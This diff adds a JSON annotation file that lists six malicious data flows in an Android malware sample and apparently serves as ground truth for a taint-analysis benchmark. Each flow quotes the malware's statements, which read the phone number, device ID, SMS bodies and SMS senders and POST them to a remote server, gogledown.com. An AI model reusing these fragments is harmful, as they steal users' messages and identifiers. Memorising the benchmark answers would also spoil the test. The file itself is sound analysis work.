@@ -1,0 +1,505 @@
+{
+  "fileName": "godwon_samp.apk",
+  "day": "2019-03-11",
+  "findings": [
+    {
+      "source": {
+        "statement": "this.phoneNum = manager.getLine1Number();",
+        "methodName": "public void onCreate()",
+        "className": "android.sms.core.GoogleService",
+        "lineNo": 27,
+        "targetName": "getLine1Number",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.telephony.TelephonyManager: java.lang.String getLine1Number()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "android.sms.core.ToolHelper",
+        "lineNo": 57,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "this.phoneNum = this.phoneNum.replace(\"+\", \"\");",
+          "methodName": "public void onCreate()",
+          "className": "android.sms.core.GoogleService",
+          "lineNo": 31,
+          "ID": 1
+        },
+        {
+          "statement": "NameValuePair pair = new BasicNameValuePair(\"sbid\", GoogleService.this.phoneNum);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.GoogleService.AnonymousClass1",
+          "lineNo": 37,
+          "ID": 2
+        },
+        {
+          "statement": "params.add(pair);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.GoogleService.AnonymousClass1",
+          "lineNo": 44,
+          "ID": 3
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gogledown.com/vipboss/saves.php\", params));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 51,
+          "ID": 4
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "android.sms.core.ToolHelper",
+          "lineNo": 56,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads the phone number and puts it into a ArrayList. This list is sent to a remote server via a HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "this.phoneNum = manager.getDeviceId();",
+        "methodName": "public void onCreate()",
+        "className": "android.sms.core.GoogleService",
+        "lineNo": 29,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "android.sms.core.ToolHelper",
+        "lineNo": 57,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "this.phoneNum = this.phoneNum.replace(\"+\", \"\");",
+          "methodName": "public void onCreate()",
+          "className": "android.sms.core.GoogleService",
+          "lineNo": 31,
+          "ID": 1
+        },
+        {
+          "statement": "NameValuePair pair = new BasicNameValuePair(\"sbid\", GoogleService.this.phoneNum);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.GoogleService.AnonymousClass1",
+          "lineNo": 37,
+          "ID": 2
+        },
+        {
+          "statement": "params.add(pair);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.GoogleService.AnonymousClass1",
+          "lineNo": 44,
+          "ID": 3
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gogledown.com/vipboss/saves.php\", params));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 51,
+          "ID": 4
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "android.sms.core.ToolHelper",
+          "lineNo": 56,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true,
+        "pathConstraints": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads the device Id when the phone number is empty. This device Id is stored in a ArrayList. This list is sent to a remote server via a HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Object[] messages = (Object[]) intent.getSerializableExtra(\"pdus\");",
+        "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+        "className": "android.sms.core.BootReceiver",
+        "lineNo": 59,
+        "targetName": "getSerializableExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r1.<android.content.Intent: java.io.Serializable getSerializableExtra(java.lang.String)>(\"pdus\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "android.sms.core.ToolHelper",
+        "lineNo": 57,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "pduObjs[i] = (byte[]) messages[i];",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 63,
+          "ID": 1
+        },
+        {
+          "statement": "pdus[i] = pduObjs[i];",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 70,
+          "ID": 2
+        },
+        {
+          "statement": "msgs[i] = SmsMessage.createFromPdu(pdus[i]);",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 71,
+          "ID": 3
+        },
+        {
+          "statement": "return msgs;",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 73,
+          "ID": 4
+        },
+        {
+          "statement": "SmsMessage[] messages = getMessagesFromIntent(arg1);",
+          "methodName": "public void onReceive(Context arg0, Intent arg1)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 30,
+          "ID": 5
+        },
+        {
+          "statement": "sb.append(message.getDisplayMessageBody());",
+          "methodName": "public void onReceive(Context arg0, Intent arg1)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 35,
+          "ID": 6
+        },
+        {
+          "statement": "params.add(new BasicNameValuePair(\"smscontent\", sb.toString()));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 46,
+          "ID": 7
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gogledown.com/vipboss/saves.php\", params));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 51,
+          "ID": 8
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "android.sms.core.ToolHelper",
+          "lineNo": 56,
+          "ID": 9
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "collections": true,
+        "interAppCommunication": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow exists in the onReceive callback method of a BroadcastReciver, it reads SMS messages to array, appends all messages to a string, stores it into a List and sends the list to a remote server via a HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Object[] messages = (Object[]) intent.getSerializableExtra(\"pdus\");",
+        "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+        "className": "android.sms.core.BootReceiver",
+        "lineNo": 59,
+        "targetName": "getSerializableExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r1.<android.content.Intent: java.io.Serializable getSerializableExtra(java.lang.String)>(\"pdus\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "android.sms.core.ToolHelper",
+        "lineNo": 57,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "pduObjs[i] = (byte[]) messages[i];",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 63,
+          "ID": 1
+        },
+        {
+          "statement": "pdus[i] = pduObjs[i];",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 70,
+          "ID": 2
+        },
+        {
+          "statement": "msgs[i] = SmsMessage.createFromPdu(pdus[i]);",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 71,
+          "ID": 3
+        },
+        {
+          "statement": "return msgs;",
+          "methodName": "private final SmsMessage[] getMessagesFromIntent(Intent intent)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 73,
+          "ID": 4
+        },
+        {
+          "statement": "SmsMessage[] messages = getMessagesFromIntent(arg1);",
+          "methodName": "public void onReceive(Context arg0, Intent arg1)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 30,
+          "ID": 5
+        },
+        {
+          "statement": "this.originAddress = message.getOriginatingAddress();",
+          "methodName": "public void onReceive(Context arg0, Intent arg1)",
+          "className": "android.sms.core.BootReceiver",
+          "lineNo": 34,
+          "ID": 6
+        },
+        {
+          "statement": "NameValuePair pair1 = new BasicNameValuePair(\"sendnumber\", BootReceiver.this.originAddress);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 43,
+          "ID": 7
+        },
+        {
+          "statement": "params.add(pair1);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 48,
+          "ID": 8
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gogledown.com/vipboss/saves.php\", params));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 51,
+          "ID": 9
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "android.sms.core.ToolHelper",
+          "lineNo": 56,
+          "ID": 10
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "interAppCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious flow exists in the onReceive callback method of a BroadcastReciver, it reads SMS messages to array, writes the sender's address into a private field, stores it into a List and sends the list to a remote server via a HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getLine1Number",
+        "targetNo": 1,
+        "statement": "this.phoneNum = this.manager.getLine1Number();",
+        "methodName": "public void onReceive(Context arg0, Intent arg1)",
+        "className": "android.sms.core.BootReceiver",
+        "lineNo": 25,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getLine1Number()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "android.sms.core.ToolHelper",
+        "lineNo": 57,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "NameValuePair pair = new BasicNameValuePair(\"sbid\", BootReceiver.this.phoneNum);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 42,
+          "ID": 1
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gogledown.com/vipboss/saves.php\", params));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 51,
+          "ID": 2
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "android.sms.core.ToolHelper",
+          "lineNo": 56,
+          "ID": 3
+        }
+      ],
+      "description": "This malicious flow reads the phone number and sends it to a rmote server via a HTTP Post request. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 5
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "this.phoneNum = this.manager.getDeviceId();",
+        "methodName": "public void onReceive(Context arg0, Intent arg1)",
+        "className": "android.sms.core.BootReceiver",
+        "lineNo": 27,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "android.sms.core.ToolHelper",
+        "lineNo": 57,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "NameValuePair pair = new BasicNameValuePair(\"sbid\", BootReceiver.this.phoneNum);",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 42,
+          "ID": 1
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gogledown.com/vipboss/saves.php\", params));",
+          "methodName": "public void run()",
+          "className": "android.sms.core.BootReceiver.AnonymousClass1",
+          "lineNo": 51,
+          "ID": 2
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "android.sms.core.ToolHelper",
+          "lineNo": 56,
+          "ID": 3
+        }
+      ],
+      "description": "This malicious flow reads device id when the phone number is empty, and it send the device id to a remote server via a HTTP Post request. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 6
+    }
+  ]
+}
